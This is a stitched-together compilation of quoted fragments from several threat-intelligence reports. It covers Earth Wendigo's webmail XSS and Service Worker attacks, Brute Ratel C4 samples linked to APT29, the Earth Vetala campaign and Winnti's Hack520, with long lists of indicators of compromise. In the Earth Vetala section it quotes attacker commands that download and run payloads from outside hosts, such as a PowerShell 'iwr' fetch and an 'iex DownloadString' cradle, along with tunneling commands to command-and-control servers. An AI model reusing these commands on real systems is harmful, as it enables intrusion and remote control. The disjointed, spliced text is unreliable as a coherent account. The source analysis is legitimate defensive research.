"It was downloaded from the same website as the sample in Table 5; however, it was targeted against an international law firm’s East Asian office, and uses a Google Code page identified in FireEye’s blog for C2, but an IP not listed in the blog post."
"Additional investigation shows that the threat actor also sent spear-phishing emails embedded with malicious links to multiple individuals, including politicians and activists, who support movements in Tibet, the Uyghur region, or Hong Kong."
"However, this is a separate series of attacks from their operation in Taiwan, which this report covers."
Figure 1.
The attack flow of Earth Wendigo’s operation Figure 2.
An example of a spear-phishing email sent by Earth Wendigo to a democracy activist.
Initial Access
Propagation
The attack begins with a spear-phishing email that is appended with obfuscated JavaScript.
Appending their malicious script to the victim’s email signature to propagate the infection to their contacts.
Exploiting a webmail system’s cross-site scripting (XSS) vulnerability to allow their malicious JavaScript to be injected on the webmail page permanently.
The registered Service Worker script can hijack login credentials and modify the webmail page to add malicious scripts in case the attackers were unable to inject the XSS vulnerability mentioned above.
"After the attackers gain a foothold into the system — either through XSS injection or Service Worker — the next (and final part) of the attack chain, the exfiltration of the mailbox, is initiated."
"The victim will receive a spear-phishing email disguised as an advertisement with a discount coupon from an online shopping website — however, an obfuscated malicious JavaScript is embedded inside."
The email leverages the webmail system’s search suggestion function to trigger the webpage to execute their script instead of directly running the malicious script.
Figure 3. The spear-phishing email disguised as an advertisement for a shopping coupon Figure 4.
"However, these emails don’t look like phishing emails and seemed more like real email sent from normal users within the same organization."
Further investigation revealed that the attacker had modified the victims’ email signatures through malicious code injection.
We think the threat actor used this approach to attempt to infect the victim’s contacts for further propagation.
Figure 5. Malicious script appended on the victim’s email signature Figure 6.
"As soon as the user executes the malicious script in the email, a cookie stealer script will be delivered and launched on the browser."
"The framework used to deliver and manage these XSS attack scripts is called “XSSER.ME” or “XSS Framework.” The stolen session keys and browser cookies are also sent to the framework to store in the database. While a stolen session key may allow the attacker to log into their target’s webmail system without a password, note that this is not the Earth Wendigo operation's ultimate goal. Figure 7."
The actor prepared two different infection methods.
The first involves injecting malicious code into the webpage via an XSS vulnerability on the webmail system.
"The vulnerability, which exists inside the webmail system’s shortcut feature, allows users to create links on the webmail front page."
"The attacker can add a shortcut with a crafted payload by exploiting the XSS vulnerability, which replaces part of the original script from the webmail system with malicious JavaScript code."
"We have reported the vulnerability to the company that developed the webmail system, which informed us that the vulnerability had been fixed since January 2020."
Figure 8.
A shortcut containing malicious code that was added to the webmail system Figure 9.
The query format used to trigger the XSS vulnerability Service Worker script exploitation
"By examining one of the malicious scripts from the Earth Wendigo campaign, we discovered that it uploaded the tampered Service Worker script to the webmail server disguised as an original script provided by the server."
It then registers the uploaded script to the user’s Service Worker before removing it from the server immediately after registration.
"For requests sent to “/cgi-bin/start,” which is a page wrapper used to show the main webmail page, the Service Worker script will reply by sending another page to the victim."
This new page is almost similar to the original wrapper but injected with a script element meant to load malicious script from Earth Wendigo’s server.
"Therefore, the victim also loads the malicious script with the replaced wrapper page whenever they access the webmail server with the malicious Service Worker enabled in the background."
We found that the returned script is a backdoor that gets its instructions from the WebSocket server.
Figure 13.
The email exfiltration flow with WebSocket backdoor Figure 14.
The script used to establish WebSocket communication Figure 15.
Additional Findings
"Besides their attack on webmail servers, we also found multiple malware variants used by Earth Wendigo."
"However, we don’t know what code they delivered because the server was already down when we were verifying the malware variants."
Figure 17.
The Python script decompiled from the malware
Conclusion
"While Earth Wendigo uses typical spear-phishing techniques to initiate their attack, the threat actor also uses many atypical techniques to infiltrate the targeted organizations, such as the use of mail signature manipulation and Service Worker infection."
"The impact of spear-phishing attacks can be minimized by following security best practices, which include refraining from opening emails sent by suspicious sources."
"To avoid XSS attacks similar to what we described in this report, we recommend adapting Contant-Security-Policy (CSP) for websites."
"Indicators of Compromise Indicator Description Detection mail2000tw[.]com Domain operated by Earth Wendigo bf[.]mail2000tw[.]com Domain operated by Earth Wendigo admin[.]mail2000tw[.]com Domain operated by Earth Wendigo googletwtw[.]com Domain operated by Earth Wendigo bf[.]googletwtw[.]com Domain operated by Earth Wendigo ws[.]googletwtw[.]com Domain operated by Earth Wendigo admin[.]googletwtw[.]com Domain operated by Earth Wendigo anybodyopenfind[.]com Domain operated by Earth Wendigo support[.]anybodyopenfind[.]com Domain operated by Earth Wendigo supports[.]anybodyopenfind[.]com Domain operated by Earth Wendigo supportss[.]anybodyopenfind[.]com Domain operated by Earth Wendigo a61e84ac9b9d3009415c7982887dd7834ba2e7c8ea9098f33280d82b9a81f923 Earth Wendigo XSS attack script Trojan.JS.WENDIGOE.A 66cf12bb9b013c30f9db6484caa5d5d0a94683887cded2758886aae1cb5c1c65 Earth Wendigo XSS attack script Trojan.JS.WENDIGOE.A 4cdaca6b01f52092a1dd30fc68ee8f6d679ea6f7a21974e4a3eb8d14be6f5d74 Earth Wendigo XSS attack script Trojan.JS.WENDIGOE.A f50a589f3b3ebcc326bab55d1ef271dcec372c25d65f381a409ea85929a34b49 Earth Wendigo XSS attack script Trojan.JS.WENDIGOE.A e047aa878f9e7a55a80cc1b70d0ac9840251691e91ab6454562afbff427b0879 Earth Wendigo XSS attack script Trojan.JS.WENDIGOE.A a1a6dc2a6c795fc315085d00aa7fdabd1f043b28c68d4f98d4152fe539f026f1 Earth Wendigo XSS attack script Trojan.JS.WENDIGOE.A 10d2158828b953ff1140376ceb79182486525fd14b98f743dafa317110c1b289 Earth Wendigo XSS attack script Trojan.JS.WENDIGOE.A 0e04a03afa5b66014457136fb4d437d51da9067dc88452f9ebd098d10c97c5b8 Earth Wendigo XSS attack script Trojan.JS.WENDIGOE.A 75f3f724a2bfda1e74e0de36ff6a12d3f2ea599a594845d7e6bc7c76429e0fa4 Earth Wendigo XSS attack script Trojan.JS.WENDIGOE.A c3bc364409bb0c4453f6d80351477ff8a13a1acdc5735a9dff4ea4b3f5ad201c Earth Wendigo XSS attack script Trojan.JS.WENDIGOE.A 5251087bb2a0c87ac60c13f2edb7c39fb1ea26984fcc07e4cf8b39db31ce2b08 Earth Wendigo XSS attack script Trojan.JS.WENDIGOE.A 7fa9a58163dd233065a86f9ed6857ed698fc6e454e6b428ea93f4f711279fb61 Earth Wendigo XSS attack script Trojan.JS.WENDIGOE.A f568f823959be80a707e05791718c1c3c377da1b0db1865821c1cf7bc53b6084 Earth Wendigo XSS attack script Trojan.JS.WENDIGOE.A a54d58d5a5812abaede3e2012ae757d378fb51c7d3974eaa3a3f34511161c1db Earth Wendigo XSS attack script Trojan.JS.WENDIGOE.A 77c3d62cce21c2c348f825948042f7d36999e3be80db32ac98950e88db4140b1 Earth Wendigo XSS attack script Trojan.JS.WENDIGOE.A ﻿c0dabb52c73173ea0b597ae4ad90d67c23c85110b06aa3c9e110a852ebe04420 Earth Wendigo Service Worker script Trojan.JS.WENDIGOE.A efe541889f3da7672398d7ad00b8243e94d13cc3254ed59cd547ad172c1aa4be Earth Wendigo WebSocket JavaScript backdoor Backdoor.JS.WENDIGOE.A 2411b7b9ada83f6586278e0ad36b42a98513c9047a272a5dcb4a2754ba8e6f1d Earth Wendigo Shellcode Loader Trojan.Win32.WENDIGOE.A 1de54855b15fc55b4a865723224119029e51b381a11fda5d05159c74f50cb7de Earth Wendigo Shellcode Loader Trojan.Win32.WENDIGOE.A d935c9fe8e229f1dabcc0ceb02a9ce7130ae313dd18de0b1aca69741321a7d1b Earth Wendigo Shellcode Loader Trojan.Win32.WENDIGOE.B 50f23b6f4dff77ce4101242ebc3f12ea40156a409a7417ecf6564af344747b76 Earth Wendigo Shellcode Loader Trojan.Win32.WENDIGOE.C fab0c4e0992afe35c5e99bf9286db94313ffedc77d138e96af940423b2ca1cf2 Earth Wendigo Shellcode Loader Trojan.Win32.WENDIGOE.C 4d9c63127befad0b65078ccd821a9cd6c1dccec3e204a253751e7213a2d39e39 Earth Wendigo Shellcode Loader Trojan.Win32.WENDIGOE.C 25258044c838c6fc14a447573a4a94662170a7b83f08a8d76f96fbbec3ab08e2 Earth Wendigo Shellcode Loader Trojan.Win32.WENDIGOE.C 13952e13d310fb5102fd4a90e4eafe6291bc97e09eba50fedbc2f8900c80165f Earth Wendigo Shellcode Loader Trojan.Win32.WENDIGOE.C ccb7be5a5a73104106c669d7c58b13a55eb9db3b3b5a6d3097ac8b68f2555d39 Earth Wendigo Shellcode Loader Trojan.Win64.WENDIGOE.A 40a251184bb680edadfa9778a37135227e4191163882ccf170835e0658b1e0ed Earth Wendigo Shellcode Loader Trojan.Win64.WENDIGOE.B 0d6c3cc46be2c2c951c24c695558be1e2338635176fa34e8b36b3e751ccdb0de Cobalt Strike Trojan.Win32.COBALT.SM Tags Articles, News, Reports | APT & Targeted Attacks | Research"
"Based on the number of “likes” the malware had generated, Faghani estimated that over 100,000 users had been infected with the malware."
"Filmkan is very flexible, giving it more capability than simple interaction with social networks."
Our WildFire analysis cloud first picked up samples of this malware on January 22 and thus far we’ve collected 44 distinct samples the display the behavior described by Faghani.
"After a few seconds the video tells the user they need to download an update for Flash player, which is the initial dropper executable."
"The Filmkan dropper has a Flash icon to help make it appear as a legitimate update. The author of Filmkan created the dropper using AutoHotkey (AHK), a legitimate tool for creating Windows applications using a custom scripting language."
"Chrome extensions allow developers to extend Google’s Chrome browser, typically by adding new functionality."
The current version of the script contains three primary functions.
When Faghani first published his analysis this component of the malware was forcing the user’s Facebook account to “like” specific posts on a community page titled Sabır.
"Users should be suspicious of any message indicating that an update for Flash is available in Google Chrome, as Chrome contains an integrated Flash runtime that is updated by Google."
Organizations should block access to the following domains to prevent Filmkan from receiving updates from the attacker.
The Bash Uploader script allows its customers to send code coverage reports to the Codecov platform for analysis.
"Organizations using Codecov’s Bash Uploader script, or one of the other impacted tools should carefully evaluate their exposure to this threat."
This post is also available in: 日本語 (Japanese) Unit 42 continuously hunts for new and unique malware samples that match known advanced persistent threat (APT) patterns and tactics.
"The sample contained a malicious payload associated with Brute Ratel C4 (BRc4), the newest red-teaming and adversarial attack simulation tool to hit the market."
"Additionally, pivoting on the certificate and other artifacts, we identified a total of 41 malicious IP addresses, nine BRc4 samples, and an additional three organizations across North and South America who have been impacted by this tool so far."
"This unique sample was packaged in a manner consistent with known APT29 techniques and their recent campaigns, which leveraged well-known cloud storage and online collaboration applications."
Attempts to execute the benign application from the ISO-mounted folder resulted in the loading of the malicious payload as a dependency through a technique known as DLL search order hijacking.
"We encourage all security vendors to create protections to detect activity from this tool and all organizations to be on alert for activity from this tool. Palo Alto Networks customers receive protections from the threats described in this blog through Threat Prevention, Cortex XDR and WildFire malware analysis."
Shellcode
Update Badger_x64.exe
Employment
"At the time, its development was a part-time effort by a security engineer named Chetan Nayak (aka Paranoid Ninja) living in India."
"That same month, he released Brute Ratel v0.9.0 (Checkmate), which is described as the “biggest release for Brute Ratel till date.” However, of greater concern, the release description also specifically noted that “this release was built after reverse engineering several top tier EDR and Antivirus DLLs.”"
"In terms of features, BRc4 advertises the following capabilities:"
The file in VirusTotal named Roshan_CV.iso (SHA256: 1FC7B0E1054D54CE8F1DE0CC95976081C7A85C7926C03172A3DDAA672690042C) appears to be a curriculum vitae (similar to a resume) of an individual named Roshan.
"It was uploaded to VirusTotal on May 19, 2022, from Sri Lanka."
The following table shows a side-by-side comparison of Roshan_CV.ISO and that of a previously identified APT29 sample (Decret.ISO).
Figure 9 is a screenshot of the default Windows File Explorer; “show hidden files” is not checked.
"In both images, the user is presented with a shortcut file (LNK file) that starts the malicious activity when double-clicked."
Figure 10 shows how the ISOs would appear when show hidden files” is enabled for viewing.
The flow of execution is the following: Roshan_CV.ISO→Roshan-Bandar_CV_Dialog.LNK→cmd.exe→OneDriveUpdater.exe→version.dll→OneDrive.Update Decret.ISO→Decret.LNK→cmd.exe→HPScan.exe→version.dll→HPScanApi.dll
"The delivery of packaged ISO files is typically sent via spear phishing email campaigns or downloaded to the victim by a second-stage downloader. While we lack insight into how this particular payload was delivered to a target environment, we observed connection attempts to the C2 server originating from three Sri Lankan IP addresses between May 19-20."
Version.dll is a modified version of a legitimate Microsoft file written in C++.
The implanted code begins when the DLL is loaded via DLL_PROCESS_ATTACH and performs the following at the DLLMain subroutine: The technique outlined above uses process injection via undocumented Windows NTAPI calls.
The decrypted payload is now running within the runtimebroker.exe memory space.
The following is a snippet of code from version.dll that starts the execution of the in-memory decrypted payload.
The purpose of this is to copy the Brute Ratel C4 code (x64 assembly) onto the stack eight bytes at a time and eventually reassemble it into a memory space for execution – a DLL with a stripped MZ header.
"When finished, the code performs the following."
This data includes the encrypted configuration settings for Brute Ratel C4.
The 16-byte RC4 decryption key is: bYXJm/3#M?:XyMBF
"The decrypted configuration file is: Each parameter is delineated with a pipe | character, and one of the values is the IP seen earlier of 174.129.157[.]251 and port of 443."
"The IP 174.129.157[.]251 is hosted on Amazon AWS, and Palo Alto Networks Cortex Xpanse history shows the IP had TCP port 443 open from April 29, 2022, until May 23, 2022, with a self-signed SSL certificate impersonating Microsoft Security:"
"Once the SSL handshake to IP 174.129.157[.]251 is complete, the following data is sent via HTTP POST to the Brute Ratel C4 listener port."
Example of badger_x64.exe:
"In this case, the sample is configured to communicate with IP 159.65.186[.]50 on TCP port 443."
"After validating that badger_x64.exe and OneDrive.Update were both BRc4 payloads, we set to work analyzing the employment of this second sample."
"Coincidentally, this happens to be one day after the ​​Roshan_CV.ISO file was uploaded."
"As noted above, the sample was configured to call home to 159.65.186[.]50 on port 443."
"Palo Alto Networks Cortex Xpanse history shows that this port was open from May 21-June 18, 2022, with the same “Microsoft Security” self-signed SSL certificate seen above."
"Evaluating netflow connections for 159.65.186[.]50 during this time window revealed several connections to ports 22, 443 and 8060 originating from a Ukrainian IP (213.200.56[.]105)."
A deeper look at connections in and out of 213.200.56[.]105 further revealed several flows over UDP port 33445.
"Examining additional connections to port 443 on 159.65.186[.]50, we identified several suspected victims including an Argentinian organization, an IP television provider providing North and South American content, and a major textile manufacturer in Mexico."
"Coincidentally, recent attempts to browse the textile manufacturer’s website result in a 500 internal server error message."
"Given the geographic dispersion of these victims, the upstream connection to a Ukrainian IP and several other factors, we believe it is highly unlikely that BRc4 was deployed in support of legitimate and sanctioned penetration testing activities."
"Expanding our research beyond the two samples discussed above, we have also identified an additional seven samples of BRc4 dating back to February 2021."
"The ""Brute Ratel C4 Tool Command and Control Traffic Detections"" signature is threat ID 86647."
"We believe it is imperative that all security vendors create protections to detect BRc4 and that all organizations take proactive measures to defend against this tool. Palo Alto Networks has shared these findings, including file samples and indicators of compromise, with our fellow Cyber Threat Alliance members."
Learn more about the Cyber Threat Alliance.
This impersonation does not imply a vulnerability in Microsoft’s products or services. Brute Ratel C4 ISO Samples: 1FC7B0E1054D54CE8F1DE0CC95976081C7A85C7926C03172A3DDAA672690042C X64 Brute Ratel C4 Windows Kernel Module: 31ACF37D180AB9AFBCF6A4EC5D29C3E19C947641A2D9CE3CE56D71C1F576C069 APT29 ISO Samples: F58AE9193802E9BAF17E6B59E3FDBE3E9319C5D27726D60802E3E82D30D14D46
"X64 Brute Ratel C4 Samples: 3ED21A4BFCF9838E06AD3058D13D5C28026C17DC996953A22A00F0609B0DF3B9 3AD53495851BAFC48CAF6D2227A434CA2E0BEF9AB3BD40ABFE4EA8F318D37BBE 973F573CAB683636D9A70B8891263F59E2F02201FFB4DD2E9D7ECBB1521DA03E DD8652E2DCFE3F1A72631B3A9585736FBE77FFABEE4098F6B3C48E1469BF27AA E1A9B35CF1378FDA12310F0920C5C53AD461858B3CB575697EA125DFEE829611 EF9B60AA0E4179C16A9AC441E0A21DC3A1C3DC04B100EE487EABF5C5B1F571A6 D71DC7BA8523947E08C6EEC43A726FE75AED248DFD3A7C4F6537224E9ED05F6F 5887C4646E032E015AA186C5970E8F07D3ED1DE8DBFA298BA4522C89E547419B Malicious DLLs: EA2876E9175410B6F6719F80EE44B9553960758C7D0F7BED73C0FE9A78D8E669 Malicious Encrypted Payloads: B5D1D3C1AEC2F2EF06E7D0B7996BC45DF4744934BD66266A6EBB02D70E35236E X.509 Cert SHA1s: 55684a30a47476fce5b42cbd59add4b0fbc776a3 66aab897e33b3e4d940c51eba8d07f5605d5b275 Infrastructure linked to X.509 Certs or Samples: 104.6.92[.]229 137.184.199[.]17 138.68.50[.]218 138.68.58[.]43 139.162.195[.]169 139.180.187[.]179 147.182.247[.]103 149.154.100[.]151 15.206.84[.]52 159.223.49[.]16 159.65.186[.]50 162.216.240[.]61 172.105.102[.]247 172.81.62[.]82 174.129.157[.]251 178.79.143[.]149 178.79.168[.]110 178.79.172[.]35 18.133.26[.]247 18.130.233[.]249 18.217.179[.]8 18.236.92[.]31 185.138.164[.]112 194.29.186[.]67 194.87.70[.]14 213.168.249[.]232 3.110.56[.]219 3.133.7[.]69 31.184.198[.]83 34.195.122[.]225 34.243.172[.]90 35.170.243[.]216 45.144.225[.]3 45.76.155[.]71 45.79.36[.]192 52.48.51[.]67 52.90.228[.]203 54.229.102[.]30 54.90.137[.]213 89.100.107[.]65 92.255.85[.]173 92.255.85[.]44 94.130.130[.]43 ds.windowsupdate.eu[.]org Hunting for APT29 Spear Phishing Using XDR - Palo Alto Networks Blog Cozy Smuggled Into The Box: APT29 Abusing Legitimate Software For Targeted Operations In Europe Trello From the Other Side: Tracking APT29 Phishing Campaigns New sophisticated email-based attack from NOBELIUM Updated July 6, 2022, at 9:30 a.m. PT."
"We believe (with moderate confidence) that this newly identified activity is connected to MuddyWater (also known as TEMP.Zagros, Static Kitten, Seedworm)."
This campaign uses the following legitimate remote admin tools such as: ScreenConnect RemoteUtilities We have named this intrusion set Earth Vetala.
Earth Vetala used spearphishing emails with embedded links to a legitimate file-sharing service to distribute their malicious package.
The threat actors would then initiate communications with additional command-and-control (C&C) infrastructure to execute obfuscated PowerShell scripts.
Earth Vetala historically targets countries in the Middle East.
The phishing emails and lure documents contain embedded URLs linking to a legitimate file-sharing service to distribute archives containing the ScreenConnect remote administrator tool.
"During this campaign, threat actors used post-exploitation tools to dump passwords, tunnel their C&C communication using open-source tools, and use additional C&C infrastructure to establish a persistent presence within targeted hosts and environments."
Technical Analysis
Figure 1. Phishing Email with the embedded URL The email attempts to convince recipients to click the URL and download a malicious file.
"The use of this tool differentiates this particular campaign from earlier research, as in previous attacks ScreenConnect was used."
"Otherwise, the TTPs in use remain broadly similar."
RemoteUtilities Analysis
"When the RemoteUtilities software is executed, its process launches msiexec.exe with the following command:"
Figure 4.
RemoteUtilities Installation The MSI installer installs a service on the victim machine called Remote Utilities – Host: Figure 5.
"Remote Utilities Service The service then communicates with the domain id.remoteutilities.com, which belongs to RemoteUtilities."
"This feature allows an intermediary Internet server to broker the connection, similar to a proxy server."
Figure 6. id-server connection
They were targeted via a malicious .ZIP file (SHA256 hash: b2f429efdb1801892ec8a2bcdd00a44d6ee31df04721482a1927fc6df554cdcf) that contained a ScreenConnect executable (SHA256 hash: 2f429efdb1801892ec8a2bcdd00a44d6ee31df04721482a1927fc6df554cdcf)
"As noted above, the ScreenConnect executable connects to the Internet-ID server, which is located at instance-sy9at2-relay.screenconnect.com and resolves to 51.68.244.39."
cmd.exe net user /domain
The command above allows the attacker to get all the users from the domain controller.
The next command executed is the following: powershell.exe -exec bypass -w 1 -file a.ps1
This is a command to execute a PowerShell script of some kind.
"However, we did not have access to the a.ps1 file."
The next command issued is the following: powershell.exe iwr -uri http://87.236.212[.]184/SharpChisel.exe -outfile c:\programdata\SharpChisel.exe -usebasicparsing
The command is connected to 187.236.212[.]184 and downloads a file called SharpChisel.exe (SHA256: 61f83466b512eb12fc82441259a5205f076254546a7726a2e3e983011898e4e2) and saves the file to the C:\programdata directory.
"The name SharpChisel may be related to the purpose of this file, which is a C# wrapper for a tunneling tool called chisel."
The above IP address is geolocated to a server in Iran.
The following command then configures SharpChisel: C:\programdata\SharpChisel.exe client 87.236.212[.]184:8080 r:8888:127.0.0.1:9999
"Another instance of SharpChisel with different settings is executed, this time using PowerShell using the following command line: powershell.exe C:\programdata\SharpChisel.exe client 87.236.212[.]184:443 R:8888:127.0.0.1:9999"
A third SharpChisel instance that connects to a different C&C server at 23.95.215.100:8080 is started via the following command: C:\programdata\SharpChisel.exe client 23.95.215[.]100:8080 r:8888:127.0.0.1:9999 It is then configured with the following command line PowerShell command: powershell.exe C:\programdata\SharpChisel.exe client 23.95.215[.]100:8080 R:8888:127.0.0.1:9999
We believe that the threat actor was unable to configure SharpChisel to work correctly.
"That supports our assumption that SharpChisel could not be configured correctly, and the attacker instead used PowerShell to download and run the legitimate procdump64.exe utility."
Figure 7.
LIGOLO execution example
This was done using two separate commands: C:\programdate\1.exe -relayserver 87.236.212[.]184:5555 C:\users\public\new.exe -relayserver 87.236.212[.]184:5555
We then see the threat actor again attempting to use SharpChisel several times using the following command: C:\programdata\SharpChisel.exe client 87.236.212[.]184:8080 r:8888:127.0.0.1:9999 powershell.exe C:\programdata\SharpChisel.exe client 87.236.212[.]184:8080 R:8888:127.0.0.1:9999
"We conclude that a tunneling connection to the C&C server could not be established, even after attempts to do so with two different tools."
The following PowerShell command was used for this: powershell.exe iwr -uri hxxp://87.236.212[.]184/out1 -outfile c:\users\public\out1.exe -usebasicparsing
"Using a UPX unpacker, we were able to extract the contents, which consists of a Python executable."
We then decompiled the python executable using pyinstxtractor.py to get all of the Python bytecode files.
The out1.exe RAT has the following capabilities: Data encoding Email parsing File and registry copy HTTP/S connection support Native command line Process and file execution
"After this, the file C:\users\public\Browser64.exe is run."
Browser64 is a tool that extracts credentials from the following applications: Chrome Chromium Firefox Opera Internet Explorer Outlook Figure 8.
"Usage Example of Browser64.exe Following the use of browser64.exe, we observed the following command being executed: powershell.exe"
iex(new
object
System.Net.WebClient).DownloadString('hxxp://23.94.50[.]197:444/index.jsp/deb2b1a127c472229babbb8dc2dca1c2/QPKb49mivezAdai1
"Finally, we observed a persistence mechanism being set using the following commands: cmd.exe /c Wscript.exe ""C:\Users\[REDACTED]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\news.js"" cmd.exe /c ""C:\Users\[REDACTED]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\newsblog.js"""
"We were able to get a copy of newsblog.js, which is a simple VBS downloader that communicates with the following URL: hxxp://23[.]95[.]215[.]100:8008/index.jsp/7e95a3d753cc4a17793ef9513e030b49/4t2Fg7k6wWRnKgd9 Figure 9."
newsblog.js
"The script then executes an HTTP GET request to the C&C URL, grabs the server's response, and sleeps for 10 seconds."
"The response from the server contains an encoded PowerShell script, which is executed in memory."
Decoding this script reveals that it contains a backdoor:
Figure 10. deobfuscated PowerShell backdoor The screenshot above shows an abbreviated view of the in-memory PowerShell backdoor.
The PowerShell backdoor has the following capabilities.
Check for Skype connectivity Download and install Skype Encoded communication with its C2 Execute commands sent from the C2 server Get multifactor authentication settings Get the currently logged on user and OS version Earth Vetala Footprint Earth Vetala conducted an extensive offensive campaign targeting multiple countries.
We observed it operating in the following countries: Azerbaijan Bahrain Israel Saudi Arabia United Arab Emirates Figure 11.
Affected countries We observed Earth Vetala target the following sectors: Government Agencies Academia Tourism Trend Micro Solutions Earth Vetala represents an interesting threat.
"This is unexpected since we believe this attack is connected to the MuddyWater threat actors — and in other connected campaigns, the attackers have shown higher levels of technical skill."
MITRE ATT&CK Techniques Mapping Tactic Technique Resource Development Acquire Infrastructure: Web Services – T1583.006 Initial Access Phishing: Spearphishing Attachment – T1566.001 Phishing: Spearphishing Link – T1566.002 Execution Command and Scripting Interpreter: PowerShell – T1059.001
Command and Scripting Interpreter: Windows Command Shell – T1059.003
"Command and Scripting Interpreter: Visual Basic – T1059.005 User Execution: Malicious Link – T1204.001 User Execution: Malicious File – T1204.002 Persistence, Privilege Escalation Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder - T1547.001 Discovery Account Discovery: Domain Account - T1087.002 Credential Access Credentials from Password Stores: Credentials from Web Browsers – T1555.003 Command and Control Data Encoding: Standard Encoding – T1132.001 Defense Evasion Deobfuscate/Decode Files or Information - T1140 Indicators of Compromise Files File name SHA-256 Trend Micro Detection Name Description SharpChisel.exe 61f83466b512eb12fc82441259a5205f076254546a7726a2e3e983011898e4e2 HackTool.MSIL.Chisel.A SharpChisel tunneling tool PD64.dll ccdddd1ebf3c5de2e68b4dcb8fbc7d4ed32e8f39f6fdf71ac022a7b4d0aa4131 Trojan.Win64.PASSDUMP.A File used by HackTool.Win64.PassDump.AC PasswordDumper.exe 0cd6f593cc58ba3ac40f9803d97a6162a308ec3caa53e1ea1ce7f977f2e667d3 HackTool.Win64.PassDump.AC"
Password dumping tool out1.exe 79fd822627b72bd2fbe9eae43cf98c99c2ecaa5649b7a3a4cfdc3ef8f977f2e6 HackTool.Win64.Lazagne.
Pyinstaller remote access tool newsblog.js 304ea86131c4d105d35ebbf2784d44ea24f0328fb483db29b7ad5ffe514454f8 Trojan.JS.DLOADR.AUSUOL VBS downloader new.exe fb414beebfb9ecbc6cb9b35c1d2adc48102529d358c7a8997e903923f7eda1a2 HackTool.Win64.LIGOLO.A LIGOLO tunneling tool Browser64.exe 3495b0a6508f1af0f95906efeba36148296dccd2ab8ffb4e569254b683584fea HackTool.Win64.BrowserDumper.A
Tool for accessing browser DBs 1.exe 78b1ab1b8196dc236fa6ad4014dd6add142b3cab583e116da7e8886bc47a7347 HackTool.Win64.LIGOLO.A LIGOLO tunneling tool
مکتبة إلکترونیة.pdf 70cab18770795ea23e15851fa49be03314dc081fc44cdf76e8f0c9b889515c1b Trojan.
PDF.RemoteUtilities.A
PDF with embedded URLs 468e331fd3f9c41399e3e90f6fe033379ab69ced5e11b35665790d4a4b7cf254 Trojan.W97M.RemoteUtilities.A RTF with embedded URLs
مکتبة إلکترونیة .zip f865531608a4150ea5d77ef3dd148209881fc8d831b2cfb8ca95ceb5868e1393 PUA.Win32.RemoteUtilities.A Archive containing RemoteUtilities
مکتبة إلکترونیة.exe f664670044dbd967ff9a5d8d8f345be294053e0bae80886cc275f105d8e7a376 PUA.Win32.RemoteUtilities.A RemoteUtilities remote access software برنامج.zip 8bee2012e1f79d882ae635a82b65f88eaf053498a6b268c594b0d7d601b1212f PUA.Win32.RemoteUtilities.A
Archive containing RemoteUtilities برنامجدولیة.zip 9b345d2d9f52cda989a0780acadf45350b423957fb7b7668b9193afca3e0cd27 PUA.Win32.RemoteUtilities.A Archive containing RemoteUtilities
"ورش مجانية.zip 5e2642f33115c3505bb1d83b137e7f2b18e141930975636e6230cdd4292990dd PUA.Win32.RemoteUtilities.A Archive containing RemoteUtilities مکتالمنحالدراسیة.zip b2f429efdb1801892ec8a2bcdd00a44d6ee31df04721482a1927fc6df554cdcf PUA.Win32.ScreenConnect.P Archive containing ScreenConnect المنح الدرایةس.exe 3e4e179a7a6718eedf36608bd7130b62a5a464ac301a211c3c8e37c7e4b0b32b PUA.Win32.ScreenConnect.P ScreenConnect remote access software Network 23.94.50.197:444 23.95.215.100:443 23.95.215.100:8080 87.236.212.184:443 87.236.212.184:8008 Tags APT & Targeted Attacks | Articles, News, Reports |"
Research
"Updated on April 26, 2017, 01:39 PM (UTC-7) to add the accurate IP address."
"In particular, we managed to gather details on an individual using the handle Hack520, who we believe is connected to Winnti."
Who is the Winnti group?
"Based on the use of domain names they registered, the group started out in the business of fake/rogue anti-virus products in 2007."
"The group, which was primarily motivated by profit, is noted for utilizing self-developed technically-proficient tools for their attacks."
"They once attacked a game server to illicitly farm in-game currency (“gaming gold”, which also has real-world value) and stole source codes of online game projects."
"The group has since earned infamy for being involved in malicious activities associated with targeted attacks, such as deploying spear-phishing campaigns and building a backdoor."
These samples led us to the discovery of additional C&C servers that provided us with more information than we initially expected.
A closer look at Hack520
Our initial investigation on the domains registered by Hack520 revealed that similar domains (listed below) were registered by another profile.
hack520[.]co[.]kr shaiya[.]kr zhu[.]kr shenqi[.]kr zhuxian[.]kr Several of these domains are linked to variants of malware that were used by the Winnti threat actor.
Figure 1: Twitter account of Hack520
"A rough translation of this message is as follows: “Fxxk, when I am released, the server is offline, I can’t find the machine, the domain is expired, it is so bad."
"After further research, we were able to link Hack520 to different network administration activities, notably with a Virtual Private Server (VPS) hosting service."
"While one of his signatures uses his own blog domain, there is also a second signature which uses 93[.]gd, a domain that was found to have been actively selling VPS services in the past."
The email address admin@93[.]gd is linked to IP addresses owned by a certain user with the nickname “PIG GOD”—another reference to Hack520’s passion for pigs.
"The IP range for “PIG GOD” is 43[.]255[.]188.0/22, which appears to be hosted in Hong Kong as seen in the information we found: inetnum: 43[.]255[.]188[.]0 - 43[.]255[.]191[.]255 netname: PIG-HK description: PIG GOD country: HK admin-c: PG406-AP tech-c: PG406-AP person: pig god country: HK phone: +852-39437000 e-mail: admin@66[.]to nic-hdl: PG406-AP mnt-by: MAINT-RAIBOW-HK changed: admin@66[.]to 20160917 source: APNIC The domain 66[.]to leads to another website that shows Hack520’s pet pig."
Figure 3: Hack520’s pet pig
We also found a live service selling VPS hosting at secure[.]66[.]to.
Figure 4: Screenshot of secure[.]66[.]to
"Threat actors are always looking to expand the strategies they use, thus security practices and solutions that work for less organized cybercriminals might not work for determined groups who are willing to spend time, resources and manpower to accomplish their goals."
Overview of Iran-Linked Campaigns:
"The target radius for these groups have spanned across the globe, across all major industries."
Iranian TTPs:
General Mitigations:
https://attack.mitre.org/groups/G0049/ OilRig is a threat group Unit 42 named and discovered in May 2016.
"This threat group is extremely persistent and relies heavily on spear-phishing as their initial attack vector, but has also been associated with other more sophisticated attacks such credential harvesting campaigns and DNS hijacking."
"In their spear-phishing attacks, OilRig preferred macro-enabled Microsoft Office (Word and Excel) documents to install their custom payloads that came in the form of portable executables (PE), PowerShell and VBScripts."
"Once gaining access to an end point, actors would use credential dumping tools, such as Mimikatz to gather credentials to legitimate accounts to then move laterally to other systems on the network."
https://unit42.paloaltonetworks.com/behind-the-scenes-with-oilrig/
